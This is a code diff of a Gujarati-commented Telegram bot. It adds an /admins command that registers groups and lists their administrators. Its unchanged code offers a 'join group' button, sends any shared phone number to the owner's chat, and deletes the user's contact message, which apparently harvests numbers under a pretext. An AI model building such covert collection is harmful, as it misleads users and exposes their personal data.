@@ -3,7 +3,7 @@ import re
 import asyncio
 from flask import Flask
 from threading import Thread
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
     MessageHandler,
@@ -20,6 +20,10 @@ GROUP_ID = -1003912250139
 
 app = Flask(__name__)
 
+# ગ્રુપની માહિતી સેવ કરવા માટેની ડિક્શનરી (મેમરી)
+# આમાં બોટ જે જે ગ્રુપમાં એડમિન હશે તેની યાદી રાખશે
+REGISTERED_GROUPS = {}
+
 # ---------------- START COMMAND ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     button = KeyboardButton(
@@ -35,6 +39,47 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "join group ઉપર ક્લિક કરો ત્યારબાદ લિંક ન મળે તો મેસેજ કરો",
         reply_markup=keyboard
     )
+
+# ---------------- ADMINS COMMAND (જે ગ્રુપમાં બોટ છે તેની યાદી મેળવવા) ----------------
+async def check_admins(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat = update.effective_chat
+    
+    # જો આ કમાન્ડ એડમિન પ્રાઇવેટ ચેટમાં આપે
+    if chat.id == YOUR_CHAT_ID:
+        if not REGISTERED_GROUPS:
+            await update.message.reply_text("❌ હજુ સુધી બોટે કોઈપણ ગ્રુપની માહિતી નોંધી નથી. કૃપા કરીને ગ્રુપમાં જઈને એકવાર /admins કમાન્ડ મોકલો.")
+            return
+        
+        text = "📋 **બોટ જે ગ્રુપમાં એડમિન છે તેની યાદી:**\n\n"
+        for g_id, g_name in REGISTERED_GROUPS.items():
+            text += f"📌 ગ્રુપ નામ: {g_name}\n🆔 ID: <code>{g_id}</code>\n-------------------\n"
+        
+        await update.message.reply_text(text, parse_mode="HTML")
+        return
+
+    # જો કોઈ ગ્રુપમાં આ કમાન્ડ આપવામાં આવે, તો તે ગ્રુપને રજિસ્ટર કરી લો અને એડમિન્સની યાદી બતાવો
+    if chat.type in ["group", "supergroup"]:
+        try:
+            # ગ્રુપનું નામ સેવ કરી લો
+            REGISTERED_GROUPS[chat.id] = chat.title
+            
+            # ગ્રુપના એડમિન્સની લિસ્ટ મેળવો
+            admins = await context.bot.get_chat_administrators(chat.id)
+            admin_list = []
+            for admin in admins:
+                user = admin.user
+                name = user.first_name
+                if user.username:
+                    admin_list.append(f"@{user.username} ({name})")
+                else:
+                    admin_list.append(name)
+            
+            admin_names = ", ".join(admin_list)
+            await update.message.reply_text(
+                f"✅ આ ગ્રુપ બોટમાં રજિસ્ટર થઈ ગયું છે!\n\n👑 **ગ્રુપ એડમિન્સ:**\n{admin_names}"
+            )
+        except Exception as e:
+            await update.message.reply_text(f"❌ ભૂલ: {e}")
 
 # ---------------- DELETE BUTTON ----------------
 async def delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -61,14 +106,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # 1. જો યુઝરે કોન્ટેક્ટ શેર કર્યો હોય
     if message.contact:
         phone = message.contact.phone_number
-        
-        # એડમિનને નંબર મોકલો
         await context.bot.send_message(
             chat_id=YOUR_CHAT_ID,
             text=f"👤 યુઝર: {message.from_user.first_name}\n📞 નંબર: {phone}"
         )
-        
-        # આ લાઈન યુઝર દ્વારા મોકલાયેલા કોન્ટેક્ટ મેસેજને તરત જ ડિલીટ કરી દેશે
         try:
             await context.bot.delete_message(chat_id=message.chat_id, message_id=message.message_id)
         except Exception as e:
@@ -79,14 +120,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if chat.id == YOUR_CHAT_ID and message.reply_to_message:
         original_msg = message.reply_to_message.text or message.reply_to_message.caption or ""
         
-        # અહીં ખાસ ચકાસણી કરીએ કે મેસેજ ગ્રુપનો છે કે કેમ
         target_id = None
-        
-        # જો ઓરિજિનલ મેસેજમાં "ગ્રુપમાં નવો મેસેજ:" લખેલું હોય તો ટાર્ગેટ ગ્રુપ જ બનશે
         if "ગ્રુપમાં નવો મેસેજ:" in original_msg:
             target_id = GROUP_ID
         else:
-            # જો પ્રાઇવેટ યુઝર હોય તો તેની ID શોધો
             id_match = re.search(r"🆔 ID:\s*(\d+)", original_msg)
             if id_match:
                 target_id = int(id_match.group(1))
@@ -114,6 +151,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # 3. ગ્રુપ મેસેજ
     if chat.id == GROUP_ID:
+        # ગ્રુપ ઓટોમેટિક રજિસ્ટર કરી લો
+        REGISTERED_GROUPS[chat.id] = chat.title
+        
         user = message.from_user
         user_mention = f"@{user.username}" if user.username else f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
         
@@ -156,7 +196,11 @@ def run_flask():
 if __name__ == "__main__":
     Thread(target=run_flask).start()
     app_bot = ApplicationBuilder().token(TOKEN).build()
+    
+    # કમાન્ડ હેન્ડલર્સ
     app_bot.add_handler(CommandHandler("start", start))
+    app_bot.add_handler(CommandHandler("admins", check_admins))
+    
     app_bot.add_handler(CallbackQueryHandler(delete_callback, pattern="^del_"))
     
     all_media = filters.TEXT | filters.PHOTO | filters.VIDEO | filters.Document.ALL | filters.CONTACT
